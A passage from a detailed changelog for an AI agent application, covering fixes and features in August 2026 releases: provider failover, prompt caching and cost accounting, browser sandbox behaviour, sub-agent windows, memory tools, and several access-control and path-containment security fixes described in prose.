  request instead of going through the shared one, and asked for a reply length in a way
  that whole generation of models rejects, so an OpenAI coder run ended on an error before
  it wrote a line. Both now read the same rules from one place, which is also what gave the
  coder the fix above for free.
- **A provider that has gone down is no longer waited for on every single message.** When
  failover is switched on and the main provider stops answering, VAF moves the request to
  the next provider in the chain. Until now it went back and knocked on the dead one first
  every time, so each message sat through the full switch-over wait before anything
  happened; and with "return to primary" turned off the opposite went wrong: it stayed on
  the stand-in for good and never looked at the main provider again, long after it had
  recovered. A provider that fails is now set aside for five minutes (adjustable, or off,
  under Settings, Advanced, Failover) and skipped in the meantime; when the time is up the
  next message you send tries it once, and it is back in use the moment it answers. Nothing
  is polled in the background, so this costs no extra requests and no tokens. A rejected
  request, as opposed to an outage, never sets a provider aside, and nothing is skipped in
  the middle of a tool call, where changing provider would break the exchange.
- **The prompt list on the right edge of the chat jumps again.** Clicking one of your
  earlier messages there did nothing at all. The chat column had just been taught to
  hold the position it was put in, because the window engine moves the view on its own
  while you read; that guard could not tell the list's own jump from one of those stray
  moves and put the view straight back, in the same frame, before anything was visible.
  The jump now announces where it is going, so it is kept instead of undone. Two more
  places quietly had the same problem and are fixed with it: returning to a chat now
  restores the position you left it at, and the sub-agent panel no longer shifts the
  conversation as it opens and closes. Reaching a message from further back than the
  chat currently shows also loads exactly the part of the history it needs, rather than
  all of it, and waits for it to be on screen instead of guessing at a delay.
- **A reply that hit the output limit no longer claims it is continuing.** The message
  shown in that case announced that it was carrying on automatically, next to a switch
  no code ever read. Nothing carried on. The message now says what actually happened,
  and the reply still ends there.
- **The archive no longer shows a strip of the chat above its own toolbar.** Opening
  an archived conversation and scrolling left a narrow band directly under the
  window's title in which the conversation slid past, above the row holding *All
  archived chats* and *Delete from archive*. That row was pinned inside the scrolling
  area, and the way browsers pin such a row put it 24 pixels lower than intended,
  leaving the band above it uncovered. It is now an ordinary header row above the
  list, so only the conversation scrolls and nothing passes over it.

## [0.1.0a26] - 2026-08-25

### Added
- **The usage log says how much of each request was served from cache.** Every line in
  `logs/usage_*.log` now carries `cache_hit` as a percentage beside the raw token counts,
  so a session's behaviour can be read without adding anything up by hand. A provider
  that reports nothing about its cache leaves the field out entirely rather than printing
  a zero, so a lane that cannot measure does not look like a lane that is not working.

### Changed
- **The Soul questionnaire's first step asks a plainer question.** "What are the
  undeniable truths it lives by?" read like a mission statement and gave you
  little to actually write down. The step now asks for the principles your agent
  follows when it decides something: what it is there for, how it works, and how
  it carries itself. The German wizard also drops the loftier step names:
  "Kernwahrheiten" is now "Grundsätze", and "Vibe" is now "Tonfall". Only the
  labels on screen change. The Soul file keeps its English section headings, so
  an existing `soul.md` and everything that reads it are untouched. The footnote
  about that file being English now gives the actual reason: language models
  cover English most broadly, so the same instructions land the same way on
  whichever model you run.

### Fixed
- **The Memory page could come up empty, saying only "Failed to fetch graph".**
  Starting VAF straight into the tray, which is what the macOS app icon does, ran two
  imports of the memory package at the same moment: the tray checking whether the
  database is up, and the web server mounting the memory routes. The package pulled all
  of its public names in at import time, and one of them leads back into the package
  itself. In a single thread Python absorbs that; with two, each waits for a lock the
  other holds, and the interpreter gives up on the import. The routes were then never
  mounted, so every memory request answered with a plain 404 and nothing on screen said
  why. Storing anything failed just as quietly. Those names are now resolved on first
  use instead of at import, so the two starts no longer collide. Nothing about how you
  use memory changes, and the same names remain importable from the package as before.
- **Two things happening at once can no longer make a call vanish from the spend
  record.** The daily record is read, updated and written back as a whole, and several
  parts of VAF write into the same one: the web workers, the tray, background runs and
  every coding sub-process. Two of them starting at the same moment each wrote their own
  total, and whichever finished last overwrote the other, so a call was simply never
  counted. A half-written file read back as an empty record, which reset the day and
  left the daily spend limit with nothing to measure until the next write. Writers now
  take turns, per account, so two accounts never wait on each other.
- **What the agent did during a turn is no longer rewritten the moment the turn ends.**
  Every finished turn used to have its intermediate steps replaced by a short summary.
  That kept the conversation small, but it changed the middle of what gets sent, and a
  provider only charges the reduced rate for the part at the beginning that is unchanged
  since last time. So the first message of every new turn was paid for in full. The
  steps now stay as they are and are only condensed once the conversation genuinely
  approaches its limit, using the same threshold that already governed that. Measured
  against a live account, the first request of a new turn went from nothing reused to
  more than eighty per cent. This helps on every provider, including a local model,
  where it shows up as a faster first word rather than a smaller bill.
- **The agent keeps a steady set of tools instead of a new one every message.** It used
  to be handed only the handful of tools it seemed to need right then, which sounds
  frugal but meant every message looked new to the provider and nothing at all could be
  reused, not the tools and not the instructions or the conversation behind them. It now
  carries a fixed set of the tools it always needs, memory, delegation and the ability to
  look for others, and simply restricts which of them it may reach for on a given turn.
  Anything outside that set is still found and added the moment it is needed, and stays
  for the rest of the conversation. Measured against a live account: seven in ten tokens
  of a chat request are now reused, and the same conversation costs a third less. On
  providers that cannot express this, nothing changes.
- **The agent's instructions stopped being rewritten on every message.** Alongside the
  clock, two more parts of the instructions changed from turn to turn: the guidance the
  agent loads for the current kind of task, and the list naming which tools it may reach
  for. Both sat near the front, so both threw away the discount on everything behind
  them. They now travel at the end of the conversation, and the instructions themselves
  are byte-for-byte identical from one message to the next. Nothing was dropped and
  nothing was frozen: the guidance still adapts to what you asked for, it just no longer
  costs the whole request to do so.
- **A conversation with the agent got dramatically cheaper after the first message.**
  Providers charge about a tenth for the part of a request they have already seen, but
  only for the stretch at the very beginning that has not changed since. The current
  time sat near the front of the agent's instructions, so every turn looked new and the
  whole request was billed at full price, every time. The clock now travels in a short
  block at the end of the conversation, where it costs only itself. Measured against a
  live account with the same three questions: the chat request went from nothing served
  from cache to 97 per cent. The agent still knows the time, and its instructions say
  where to look for it.
- **A block that came and went no longer sits at the very front of the agent's
  instructions.** Providers charge far less for the part of a request they have seen
  before, but only for the stretch at the beginning that is unchanged. One status
  block was inserted ahead of everything else whenever the agent switched into
  planning mode, and switched off again two turns later, which made the whole
  request look new every time. Measured on a live account, the chat request was
  paying full price on every single turn while a neighbouring lane on the same
  account paid a tenth. The block is unchanged and still shown, it now sits at the
  end of the instructions instead of the start.
- **The usage view counted every call's tokens against the wrong call.** Providers
  report what a request cost in a final piece of the response that carries no text,
  so VAF recorded the figures but read them one step too early: each call was booked
  with the previous call's token counts, and the very first call of a session was
  booked with a rough guess instead. Totals over a long session came out close
  enough that nothing looked wrong, while any single line was somebody else's. The
  figures are now read after the response ends, including when a reply is cut short.
  Records written before this are not corrected; they were never far off in total.
- **An account without admin rights no longer receives cost amounts in the usage
  view.** The page has always been meant to show you your own consumption and to
  keep what the instance's API keys cost to the operator, and the filter that did
  that named the fields to remove rather than the fields to send. Anything the
  records learned afterwards therefore went out by default: the per-currency
  amount has been included since it was added, and the new figure for what
  caching saved would have followed it. The filter now names what may be sent, so
  a field added later is withheld until somebody decides otherwise. Your own token
  and call counts are unchanged, including how much of your prompt was served from
  a cache.
- **The cost figure now counts what a cached prompt actually costs, and the daily
  spend limit counts with it.** Every provider serves the repeated part of a long
  conversation from a cache and bills it at a fraction of the normal price, and none
  of that reached the estimate. On Anthropic the cached part was not counted at all,
  so the figure was far too low and a daily limit did not stop where you set it. On
  OpenAI and the providers shaped like it the whole prompt was charged at full price,
  so the figure was too high. Both are corrected, per provider, at the cached rate
  each one publishes. Where a provider publishes no cached rate the full price is
  still assumed, which keeps the figure an upper bound rather than a guess. The Usage
  view can also show how much of what you send is being served from a cache, and a
  provider that does not report it is shown as not reporting rather than as zero.
- **Four provider settings can no longer be changed by everyone on the network.**
  Whether Anthropic caches the prompt, whether Anthropic and Google show their
  reasoning, and which endpoint the browser agent, local vision and the failover
  lane send their prompts to were all writable by any non-admin account on the
  machine's network. The first three decide what every request on the instance
  sends and therefore what everyone's tokens cost; the last decides where prompts
  leave the machine. All four are now admin-only, like the other backend settings
  around them. If you changed one of them from a non-admin account, ask an admin
  to set it instead.
- **Provider errors reach the log again.** When a model provider refused a request,
  VAF showed the error in the chat but wrote nothing to `logs/backend_*.log`, even though
  the debugging guide has always said that is where provider errors go. The line meant to
  write it named a module that does not exist, and because the write is wrapped in a
  catch-all the failure was silent, for every provider, since the line was written. It
  writes now. A check was added alongside it: an import naming a module that was never
  there now fails the test suite instead of quietly removing a feature.
- **The first-run setup no longer looks like a login, and its step bar fits on one
  line.** The header above every setup step announced "User Login" on a page where
  nobody has an account yet; during setup it now says so, in your language. The bar
  underneath it has five steps but was laid out on a grid built for four, so the
  last step dropped underneath the fourth instead of standing next to it, and the
  "Veyllo API" label broke over two lines. Both are fixed, and two German lines on
  the agent-name step got their umlauts back.
- **The interactive browser works on Apple Silicon.** Its window stayed empty and
  the server answered a 502, and it could not be repaired either, because the
  browser image refused to build on an arm64 machine at all: the build fetched the
  display server package for the wrong processor and the install broke off. The
  processor is now taken from the builder instead of defaulting to Intel, and a
  build that cannot tell which processor it is for stops and says how to tell it,
  rather than guessing. On an Intel machine the guess happened to be right, which
  is why this never showed up anywhere else.
- **A browser that shows you nothing is no longer called healthy.** The browser
  container has two halves: the part the agent steers and the part you actually
  see. Only the first was checked, so a container whose picture never came up was
  handed out as working and greeted you with an error the moment you opened it.
  Both halves are checked now, in the container itself and before a browser is
  handed to you, and the log names which half failed and what to do about it.
- **The containers VAF builds itself are rebuilt when you start it.** The browser
  and the speech container are built from the source on your machine rather than
  downloaded, and starting VAF reused whatever had been built before, however old.
  One machine ran an image sixteen days behind its own code, missing a whole
  feature, with everything reporting healthy the entire time. Updating could not
  have fixed it either, because updating never rebuilds these. They are rebuilt on
  start now, which costs seconds when nothing changed. A build that fails also
  reports what the builder said instead of blaming the clock.
- **The chat follows the answer again, and stays put while you read.** Sending a
  message did not bring the view back down to the newest content, so your own
  message and the whole reply could appear out of sight below. Reading something
  further up while an answer was still arriving pulled you back down. In the
  desktop window it was worse: with an image in the conversation, every single
  keystroke jumped the view onto that image. Four separate causes, from a
  detection that was never switched on to a scroll instruction that this window
  ignores entirely. Sending now returns the view to the newest message, and
  scrolling up holds where you left it.
- **Local image recognition works.** Asking about an attached image answered that
  vision was unavailable, even with everything configured. The second file a local
  model needs to see pictures was being fetched under a name only one model family
  uses, so for the other the download failed, and the failure went to the screen
  for a moment instead of into the log. The name is now read from where the file
  actually lives, and a failure is written down.
- **Stopping VAF stops VAF.** The stop command reported success while everything
  kept running, or claimed nothing was running while it was. Afterwards an update
  could install fine and you would still be served the old version, with nothing
  to indicate it. On macOS the same command also left the web interface holding its
  port, because two of the commands it used exist only on Linux.
- **You get the browser back when the agent is done with it.** If you had opened
  the interactive browser yourself, the agent only borrows it and is supposed to
  hand it back at the end, on the page it left behind. Instead the window stayed
  in the agent view for good, with neither control nor that page. The browser can
  run as your own instance or as the shared one, and which of the two you get is
  decided separately when you open it and again when an agent starts. If that
  answer changed in between, the agent handed the browser back to a different one
  than you were holding, so the message that you may take over was never sent at
  all and your window waited for it forever. The hand-back now follows your
  session wherever it is.
- **A release cannot be published unless the frontend builds first.** The release
  check ran the Python tests only, so a version could be published, and offered to
  everyone as an update, without the web interface having been built on any
  machine. That is exactly how the previous release shipped an app that stopped at
  the splash screen. The frontend is now built on Linux, macOS and Windows before
  a release is created.

## [0.1.0a25] - 2026-08-24

### Fixed
- **The app comes up again after updating.** On a fresh install the frontend
  refused to build, so the update finished and then the window never showed
  anything but the splash screen. A test file that no test runner has ever run
  sat inside the production type check; the frontend framework used to discard
  its errors and, from its latest version on, no longer does. Test files are
  excluded from the build's type check now, which is what they always were in
  effect.
- **An update no longer blocks every update after it.** Building the frontend
  rewrites a generated file, and the updater read that as an unsaved change of
  yours and refused to continue - the same deadlock a lockfile caused once
  before. Anyone whose update left them stuck can update again.

### Fixed
- **A button you cannot read no longer appears in dark mode.** Hovering the
  update button turned it dark while its label stayed dark, so the label
  vanished. The dark theme re-points the colour named "white" to its dark
  surface tone, and these buttons asked for "white" on hover; every other
  button of the same shape already asked for the light grey it meant. The same
  slip is fixed in the confirmation dialog and on the microphone gate's drag
  handle, which was supposed to light up and never did.

### Changed
- **The frontend is built in CI now, on Linux, macOS and Windows.** Nothing in
  the pipeline installed or built it before, so a dependency bump could pass
  every check and still leave users with an app that would not start. The build
  installs strictly from the committed lockfile, so a lockfile that disagrees
  with the dependency list fails loudly instead of being quietly worked around.
  It found such a disagreement immediately: the committed lockfile was missing a
  package that stricter npm versions insist on, which is why installing on a Mac
  failed. It is regenerated here, and accepted by both npm versions now.


## [0.1.0a24] - 2026-08-23

### Fixed
- **The searching magnifier is back, at full size.** The scene where the agent
  hunts with a magnifier and the search dust flares up had been switched off in
  the actions timeline because it was assumed there was no room for it. There
  usually is: the timeline now measures the space beside the chat column and
  plays the whole scene whenever it fits, which on a normal window is always.
  Only a genuinely cramped column, or a phone, falls back - and that fallback is
  no longer a figure merely glancing about, but a compact magnifier sweeping
  inside the agent's own square, on the same clock and in the same phase as the
  glance.
- **A chat no longer dies with a provider error when the agent corrects
  itself.** When the agent caught itself claiming a tool result it had not
  received, it re-asked with a correction, and on Veyllo that second request
  came back as an error twice in a row, leaving the raw error text where the
  answer belonged. Measured against the gateway: it refuses a request in which
  the agent speaks again after a tool result without the conversation being
  handed back to the person. The correction now travels as such a turn, which
  is what the same code already does for local models, and the identical
  request that failed comes back answered.
- **A reopened chat shows its own pictures again.** A picture sent with a
  message was stored and was still on the server, but reopening the chat left
  the message without it: the browser rebuilt each message field by field when
  it loaded a conversation, and the attachments were not among the fields it
  carried over. They are now, so a chat looks the same after a reload as it did
  when it was written.
- **Copying now works where it quietly did nothing.** Six places offered a copy
  button that could fail without saying so: the verification codes in the
  Telegram and Discord setup, the device code in the GitHub setup, the network
  address in Settings, a newly created user's password, and the two-factor key
  during login. Reached over the local network rather than on the machine
  itself, the browser does not offer the clipboard at all there, so the press
  either did nothing or broke the dialog it was in. All of them now fall back to
  a way of copying that works anywhere.
- **A link inside a chat's workspace can no longer lead out of it.** Every
  workspace lane (browsing, upload, delete and the new folder action) decided
  "is this still inside the chat's folder" by comparing text. A symbolic link
  that lives inside the workspace and points elsewhere passes that test, so the
  read or write landed at the link's target instead. Containment is now decided
  on resolved paths, for all four lanes at once, and a folder or file name that
  carries a separator or an invisible character is refused as bad input instead
  of failing as an internal error.
- **Idle windows stop pretending to work.** A specialist window opened by hand
  used to claim activity that did not exist: the Coder said "Planning…", every
  window's banner said "Starting - waiting for the agent…", the Librarian said
  "Scanning", consoles said "Waiting for output…" - all with no run behind
  them. Every one of these now tells the truth while idle, and the spinners
  only spin when something actually runs.
- **You are no longer offered tools your account cannot use.** The per-user tool
  permission was enforced only when a tool was actually called, so a tool an
  administrator had disabled still appeared in the `/` suggestions - and the
  refusal arrived after you picked it. Every tool list the app sends now carries
  only what that account may run, and it errs on the side of hiding an entry if
  the permission lookup fails.

- **Escape closes the workspace window, and closes exactly one thing.** The
  chat's workspace explorer could only be left through the X in its header:
  Escape did nothing there, so a delete confirmation, which covers that X, left
  no way out but answering it. Escape now steps back one level, innermost
  first: the delete confirmation, then the right-click menu, then a half-typed
  folder name, then the search box, then the window. It is also no longer a
  press that dismisses two things at once. The app answers Escape in one place
  now and hands it to the topmost thing on screen only, so a panel open beside
  the chat no longer closes underneath the dialog you meant to leave.
- **Reopening the workspace window lands where you expect.** Closing it kept
  the folder you had drilled into, the workspace you had opened from the list
  of all workspaces, and the search you had typed, so opening it again from a
  chat could show another chat's files, or that list instead of the chat's own
  folder, with a Back button that looked live and did nothing. Closing it now
  clears all of that.

### Added
- **A specialist's window shows the specialist.** The generic glyph in the top
  left of every sub-agent window is now the agent itself, wearing its trade's
  colour, so a window is recognisable as that specialist's workplace at a
  glance. All eight window headers draw the same seat, and the kinds and their
  colours are declared once instead of in three places.
- **Each specialist wears its own colour in the picker.** In the sub-agent
  window the researcher, the document writer and the librarian now carry their
  trade's colour in the agent's body while the eye stays white, so you can tell
  them apart before reading the name. The coder keeps the plain body: its
  workplace is a code editor, black and white like the tools it imitates.
- **Every chat has a header, and its name is where you rename it.** The chat's
  name now stands at the top of the conversation, and clicking it renames the
  chat right there, through the same lane the sidebar has always used. The
  header has no edge of its own: it is the same colour as the page behind it,
  and the text scrolling up dissolves into it instead of sliding under a line.
  On a phone the app's own top bar carries the name instead, so there is still
  only one bar.
- **The specialists sit in that header now, left to right.** The globe, the
  specialists you picked and the plus that adds one used to run down the right
  edge of the conversation; they now run along the header, in the same order,
  and the plus stays in one place instead of sliding down as specialists
  arrive. Nothing about picking or opening them changed.
- **An agent reply can be read aloud, saved, copied and asked again.** Next to
  the timestamp under every reply sit four small actions. Read aloud moved here
  from beside the bubble, where it sat alone and read as a different kind of
  control than the rest; it now also reaches replies from a turn that used
  tools, which never had it. Save writes that reply
  to a Markdown file through your own system's Save dialog. Copy puts the same
  Markdown on the clipboard, and now works over the local network too, where
  the browser's own clipboard is simply not available and copying used to do
  nothing at all. Ask again is offered on the newest reply only, and only while
  the chat is idle: it asks once before it fires, then discards that exchange
  and puts the same question again. It is refused while an answer is still
  being written and while a specialist of that chat is still working, so
  nothing that is still being produced can be thrown away.
- **The workspace window gets a right-click menu.** Right-clicking the file
  area of a chat's workspace offers "New folder" (a draft tile in the grid:
  type the name, Enter creates it) and "Upload files"; right-clicking a
  folder adds "Open folder" and "Delete folder". Until now a folder could
  only be created here from the Coder window's idle Explorer.
- **`vaf.contained_path`, `vaf.safe_entry_name`, `vaf.PathEscape`**: keeping a
  path that came from outside inside the directory it may touch, now part of the
  public framework surface. Containment is decided on resolved paths, so a
  symlink cannot carry a caller out of the root, and a path that does not exist
  yet still gets an answer, which is what a tool needs before it creates
  anything. See docs/EMBEDDING.md.
- **Specialist windows are useful while they rest, and windows you opened
  stay yours.** Idle now moves INTO each window's own face instead of
  replacing it. The Librarian shows this chat's workspace inside its own
  folder view - the same explorer it uses when working, only now the rows
  are yours to click: folders drill in, files open straight into the right
  viewer (code, document, image, web page), until the Librarian itself
  starts working. The Coder keeps its editor and, like any editor before a
  project is opened, says so - while its Explorer offers the workspace, and
  a clicked file opens read-only in its own tabs. Whatever folder you are
  looking at travels with your next message, so "sort this" means the
  folder on your screen. In the Coder you can also mark a folder as the
  project - the next run then continues in exactly that folder instead of
  creating a fresh one; the welcome screen offers the folders around you as
  one-click picks, and a right-click in the Explorer opens a small context
  menu that can pick a project, open a folder, or create a new folder right
  there in the workspace. And every hand-opened specialist window follows
  the browser's rule: it never closes itself after a run, successful or
  not - only your own close or a chat switch ends it. A window that already
  shows a finished run keeps showing it - that result is the useful view
  after work.
- **Your specialists now have a window you can just open.** Clicking a
  sub-agent in the rail opens its window whether or not it is running, the way
  the globe opens the browser, and clicking it again slides it away. While a
  window is open the message box shows which specialist you are in - and the
  agent is told the same thing, so "fix the failing test" typed with the Coder
  open is understood as being about that work, and the agent knows it can hand
  it straight to the Coder instead of answering into the void. Each specialist
  wears its own colour there - the one its window already uses, so the
  librarian is orange, the document writer teal, the researcher violet and the
  browser stays blue; the coder keeps the black and white of a code editor.
- **A hotbar for the sub-agents.** A plus below the globe opens a panel with the
  specialists the agent can hand work to - each with its own trade symbol - and
  the ones you pick sit in the rail from then on, one click from any chat. The
  choice belongs to your account, not to the browser, so a second person signing
  in on the same machine gets their own rail; and a specialist an administrator
  has not granted you never appears in the panel at all.
- **The coder now proves its work before claiming it, and you can watch the
  guardrails fire.** Three deterministic gates joined the coder's loop:
  finishing a task is blocked while changes have not been verified (a green
  `run_tests`, or a clean `render_check` for web pages - only where such a
  lane exists, and degrading to an explicit "untested" note instead of
  looping when the environment cannot verify); editing a file the run has
  never read is refused ("read it first" - editing from memory is where
  doom loops start); and creating a file whose name matches an existing one
  points out the sibling instead of letting a duplicate be born. Every gate
  block, stuck-detection firing and context reset now also reports into a
  new Guards tab in the coder window's bottom panel, so the run's
  self-corrections are visible instead of terminal-only. Lint feedback is
  immediate on BOTH write lanes now - an edited file used to stay unlinted
  until the task ended - and a fixed file stops blocking completion the
  moment its latest lint passes. A lifecycle stepper above the task list
  shows where the run is (plan, build, document, commit) - the
  documentation pass and the final commit used to happen invisibly - and
  test runs and render checks now announce themselves in the live action
  line instead of looking like a frozen editor.
- **The coder can now look at the page it just built.** A new `render_check`
  tool opens an HTML file from the project (or a URL) in the sandbox browser
  and reports what a developer checks first: page errors, console output,
  failed requests, the rendered text, and a screenshot. The coder gets it as
  an inner tool next to `run_tests` - write the page, render it, read what
  actually happened, fix, render again - and the chat agent gets it as
  `render_check` (the screenshot lands in the chat workspace for
  `analyze_image`). Dev servers on the host are reachable via rewritten
  `localhost` URLs when they listen on `0.0.0.0`. While you or an agent run
  are using the browser, the probe answers busy instead of taking over your
  tab.
- **Uploading in the browser starts from your own files.** The sandbox
  browser's file picker used to open into an empty container home - your
  files simply did not exist in there. Your file area is now mirrored into
  the browser (kept fresh within seconds, size-capped), the picker opens in
  it with a Workspace bookmark in the sidebar, and agent runs can attach
  exactly those files through their upload action - nothing else. A change
  of user wipes the mirror unread; `VAF_BROWSER_WORKSPACE_SYNC=off` turns
  the mirroring off entirely.
- **Browser downloads land in your files, not in the sandbox.** A file
  downloaded in the sandbox browser - by you or by the agent - used to exist
  only inside the browser container, where nobody could reach it. Finished
  downloads now appear in your own file area (`Downloads` folder) within
  seconds, after passing the same threat scan every other arriving file gets;
  blocked files are refused and show up in the security dashboard. Downloads
  belong to whoever holds the browser, a change of user purges leftovers
  unread, and `VAF_BROWSER_DOWNLOADS=off` disables downloading entirely,
  enforced in the browser itself.
- **The browser agent can see now - and it browses smarter.** With a
  vision-capable model, browser runs take screenshots on demand and stop
  scrolling blind: scroll and layout decisions finally have eyes. Without
  one, nothing breaks - a configured vision model describes screenshots on
  request, and with no vision at all the run simply continues on the page
  text as before. A new "Browser agent model" setting (Settings, AI & Model)
  gives browser runs a dedicated strong vision model without changing your
  chat model. Runs are also coached to navigate efficiently (jump to matching
  text instead of scrolling one screen per reasoning step), and a new
  one-step action reads a whole page at once, lazy-loaded content included.
  The underlying browser-use engine moved from 0.13.1 to 0.13.8.
- **The chat centres its text for as long as there is room, and only shifts
  left when the column gets tight.** The conversation used to centre twice
  over - the container as a block and every message row again inside it - so
  in a narrow column (a browser window or viewer docked on the right) a wide
  empty margin sat on the left while the text starved. The rows now follow
  the column's actual width: plenty of room means centred exactly as always,
  even with a panel open on a wide monitor; a genuinely tight column moves
  the text to the left edge and gives it the space - live, including while
  the panel is being resized. The sidebar's hover expansion also floats over
  the conversation now instead of pushing it sideways.
- **Every user gets a browser of their own, in parallel.** Two people at a
  time now each get their own browser container with its own persistent
  profile and its own container network: history, saved passwords and
  downloads are genuinely per-user, no user's browser can reach another's,
  "busy" between users disappears, and two people (or their agents) browse at
  the same time. Settings > Advanced > Browser pool sets how many browsers may
  run at once (admin only, two by default, zero switches the feature off);
  budget about 2 GB of RAM per user you raise it by. The pool refuses new
  browsers when memory runs low, parks idle ones after a while (keeping their
  data), and falls back to the shared browser with its handover scrub whenever
  it cannot serve.
- **The shared browser forgets the previous user when it changes hands.** On
  any change of user - an interactive session, an agent run, or an unknown
  state after a server restart - the sandbox browser now scrubs cookies and
  every site's stored data (localStorage, IndexedDB and friends) before the
  next user touches it; previously only cookies were cleared, and the agent
  lane inherited whatever the last user left behind. A non-persistent
  `browser_agent` run now truly starts clean, as its description always
  promised. `VAF_BROWSER_SCRUB=full` deepens the handover to a whole-profile
  wipe (history, browser-saved passwords, autofill, downloads) with a short
  browser relaunch.
- **The sandbox browser blocks ads and malware domains.** uBlock Origin Lite
  (the official release build, version-pinned and checksum-verified at image
  build) now rides in the browser container and filters ads, trackers and
  malicious ad payloads for hand-driven and agent-driven browsing alike. DNS
  resolution goes through Cloudflare's security resolver (1.1.1.2, malware and
  phishing blocking - deliberately not the family variant, which censors
  content): encrypted via DNS-over-HTTPS where reachable, with the container's
  plain DNS pointed at the same resolver as the fallback. Takes effect after a
  browser image rebuild.
- **Watching the agent browse now shows the real browser.** During a
  `browser_agent` run started from a chat, the browser window streams the
  sandbox Chromium itself - real tab strip, real omnibox, live - instead of a
  rebuilt address bar over 1.5-second screenshots. The stream is watch-only
  (the run must not be typed into) and is offered only to the chat that owns
  the run; the task, action plan, history and activity panels stay below the
  viewport. Where no live stream exists (workflow tile, spawned child runs)
  the screenshot view remains.
- **An agent run only borrows your browser.** If a `browser_agent` run takes
  over while you are driving the sandbox browser, the window no longer closes
  on you when the run ends: the server remembers whose interactive session was
  evicted and hands the browser straight back, and the window returns to the
  interactive mode by itself. A short handover veil plays in both directions -
  you to agent, agent back to you - so the change of hands reads as one motion.
  Runs that took a free browser close the window afterwards, as before.
- **The browser window closes with an animation.** Closing used to snap the
  window away while the panel beside it collapsed smoothly; the slide-out now
  plays on close too, and the interactive stream is stopped only after it has
  played.
- **The agent knows it can take the browser over from you.** While you are
  driving the sandbox browser, your messages already carried the page, your
  selection and a screenshot along - but nothing said what the agent could do
  about it, so asking it to open a page and wait got you an answer instead of
  an action. That turn now also says that `browser_agent` drives the very same
  browser: it takes over for the length of the run, hands control back when it
  finishes, and sees whatever you are logged into.
- **The sandbox browser is now yours to drive.** Opening the browser window
  (the globe in the chat's top-right corner) with no agent run underway shows
  the sandbox Chromium fullscreen and USABLE: click, type, scroll, use
  Chromium's own tabs and omnibox, streamed at up to 60 fps over a KasmVNC
  lane instead of the agent view's 1.5-second screenshots. Logins persist the
  way they do in any browser - the browser itself asks whether to remember
  them, no extra switch in our chrome - and they land in your personal browser
  store, the same one the agent's persistent sessions read, so a login you
  performed by hand is a login the agent has on its next run. One person
  drives at a time;
  another user asking sees "busy" without learning who. While you drive, your
  chat knows it: a small "Browser" chip appears beside the workspace chip, and
  every message you send carries the page you are on, any selected text, and a
  screenshot of your current view - as a normal image attachment the agent can
  see. The agent always wins:
  when a `browser_agent` run starts it takes the browser back and the window
  returns to the familiar task/actions/history view, and when the run ends the
  interactive browser is one click away again. The stream reaches the page
  only through the VAF server with a per-session ticket; the container port
  stays loopback-only.
- **The chat and the side panel share the space you give them.** The border
  between the chat and the right panel carries a drag handle: pull it to
  resize both, with sensible minimum widths on each side, double-click to go
  back to the automatic layout. The chosen width survives reloads.
- **A browser button in the chat, so the browser window is no longer only
  reachable while an agent happens to be using it.** A globe in the chat's
  top-right corner, on the same line as the sidebar logo, opens and closes the
  Browser Agent window; while the window is open the button stays marked. It
  opens a window rather than starting anything: `browser_agent` is a tool the
  agent calls, so what the button shows is what actually exists - the last
  browser run's screenshot, visited URLs and action plan after a run, and an
  empty browser saying "No browser session yet" when there was none. That
  empty state replaces a "Starting Browser Agent" banner which, in a window
  opened by hand, announced an agent nobody had called. While another
  sub-agent is actually running, the button stands down and says so, so a
  click can never hide live work behind a browser view.
- **The agent can now update a memory instead of saving it twice.** A new
  `memory_update` tool rewrites an existing long-term memory in place - the
  same operation the Memory page has always offered, now available to the
  agent itself. And `memory_save` checks first: when a nearly identical memory
  already exists, it does not write a twin but answers with the existing
  memory and its id, and the agent decides - update it, or insist on a
  separate save. Memory search results now name each memory's id so the agent
  can refer to one. The duplicate check is deliberately careful in the other
  direction too: if it cannot run (memory database down), saving simply
  proceeds, so a check never stands between "remember this" and the save.
  Learned documents are protected: a section of a learned PDF is a record of
  what that source says, so `memory_update` refuses it and points to the
  honest lanes instead - learn the newer document version, or save a
  correcting note that is retrieved alongside the section. Nothing valuable
  can be silently overwritten that way.
- **Tools are grouped into bundles instead of one long wall of cards.** Settings
  -> Available Tools now shows one card per integration or area - GitHub,
  WhatsApp, Telegram, Email, Calendar and so on - with the number of tools in
  it and how many of them VAF has learned. Clicking a bundle opens a shelf
  across the full width, directly under the card you clicked, holding that
  bundle's tools; a notch on the card points at the shelf it opened. The rest of
  the grid keeps its place, so opening a bundle no longer rearranges everything
  else on screen. Searching still searches tools: type anything and the grid
  switches to the matching tools, ungrouped. The same grouping now applies in
  the terminal - the `vaf` settings tool table and the terminal app's tool
  overlay print one section per bundle instead of 120 alphabetical rows, and the
  agent's own tool list is grouped too. Which bundle a tool belongs to is
  declared on the tool itself, so a tool you write - or a connected MCP server -
  can name a bundle of its own. Tools you upload yourself stay recognisable:
  they get their own bundles ("Custom GitHub" next to "GitHub", never inside
  it), and the custom-tool editor now has a bundle picker instead of expecting
  you to know the attribute by heart.
- **The tools window now says how much of your toolbox VAF has learned.** Settings
  -> Available Tools counts the installed tools along the top: how many there
  are in total, how many VAF has trained itself on, and how many it has not.
  The numbers cover every installed tool, not only the ones matching the search
  box, so they agree with the "modules installed" line beside them. A tool whose
  training was invalidated because the tool itself changed counts as not learned
  until it is trained again, while its own card keeps saying "Stale". The header
  also names the tool that is being trained right now, whichever part of VAF
  started that run, and clicking the name opens the run's training window. A run
  started by a `vaf` command in its own terminal belongs to that process and is
  not shown here.
- **Around sixty mail providers now come pre-configured.** Adding an IMAP
  account no longer needs server settings typed by hand for GMX, WEB.DE,
  mail.com, T-Online, IONOS, 1&1, freenet, Posteo, mailbox.org, Zoho, Fastmail,
  AOL, Yandex, Mail.ru, Vodafone, Bluewin, A1, Orange, La Poste, Libero and
  Seznam, alongside the Gmail, Outlook, Yahoo and iCloud entries that were
  already there. Every host was checked against the live server before it was
  added.
- **A dangerous file is now recognised everywhere, not just once.** When an
  administrator deletes a quarantined skill, VAF keeps the verdict: it records
  the fingerprint of the bundle and of the files that earned the block in a
  machine-wide list. From then on, every place a file can arrive checks against
  that list before doing anything with it - chat attachments and images, the
  chat workspace upload, files put into a shared agent room, Telegram, Discord
  and WhatsApp media, mail attachments, cloud-sync downloads, and skill
  installs. A match is refused outright and appears on the security dashboard.
  Renaming the file or repacking it into a different bundle does not help: the
  content itself is what is recognised, using two independent secure hashes.
  Administrators can see and manage the list under Logs -> Overview, or from a
  terminal with `vaf security threats list | check | add | remove`. Removing an
  entry re-opens every lane at once, so it asks for the admin's 2FA code.
- **Files that merely look suspicious are pointed out, never blocked.**
  Alongside the check above, uploaded text is scanned for patterns that are
